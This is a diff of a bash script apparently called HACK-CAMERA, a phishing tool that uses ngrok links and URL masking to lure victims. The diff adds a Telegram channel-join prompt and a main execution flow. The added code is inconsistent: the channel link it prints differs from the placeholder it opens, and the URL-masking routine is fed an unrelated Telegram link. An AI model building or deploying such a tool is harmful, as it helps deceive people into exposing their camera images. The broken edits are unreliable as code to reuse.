@@ -13,7 +13,6 @@
 
 
 # Colors
-
 black="\033[1;30m"
 red="\033[1;31m"
 green="\033[1;32m"
@@ -32,7 +31,7 @@ error="${cyan}[${white}!${cyan}] ${red}"
 success="${red}[${white}√${red}] ${green}"
 
 
-cwd=`pwd`
+cwd=$(pwd)
 
 # Logo 
 logo="    
@@ -41,14 +40,9 @@ ${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \
 ${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
 ${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
 ${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
-${green}                                               [By - mp_trickz]
+${green}                                               [  By mp_trickz   ]
 "
-#telegram join command by seedhe maut
-open_telegram_channel() {
-    echo -e "\n${GREEN}[${WHITE}+${GREEN}] Opening Telegram Channel..."
-    # Replace the URL with your Telegram channel URL
-    xdg-open "https://t.me/seedhe_maut"  # Adjust based on your system or environment
-}
+
 # Package Installer
 pacin(){
     if $sudo && $pacman; then
@@ -97,6 +91,21 @@ ngrokdel() {
     rm -rf ngrok.zip
 }
 
+# Function to force Telegram channel join
+force_join_telegram() {
+    echo -e "${ask}Would you like to join our Telegram channel for updates? (y/n) "
+    read choice
+    if [ "$choice" = "y" ] || [ "$choice" = "Y" ]; then
+        echo -e "${info}Join our Telegram channel for updates: https://t.me/seedhe_maut"
+        sleep 1
+        echo -e "${info}Opening Telegram..."
+        sleep 1
+        termux-open-url https://t.me/YourChannelName  # Replace with your actual Telegram channel URL
+    else
+        echo -e "${info}Skipping Telegram channel join."
+    fi
+}
+
 # Set template
 replacer() {
     while true; do
@@ -132,6 +141,21 @@ replacer() {
         echo -e "${success}URL 2 > ${masked}\n"
     fi
 }
+
+# Main execution flow
+clear
+echo -e "$logo"
+
+# Check if offline
+netcheck
+
+# Call the function to force Telegram join
+force_join_telegram
+
+# After successful operation, call the function to set template
+replacer "https://t.me/seedhe_maut"  # Replace with your actual forwarding link
+
+# Optionally, you can call other functions or continue with your script's logic here.
 
 # Prevent ^C
 stty -echoctl
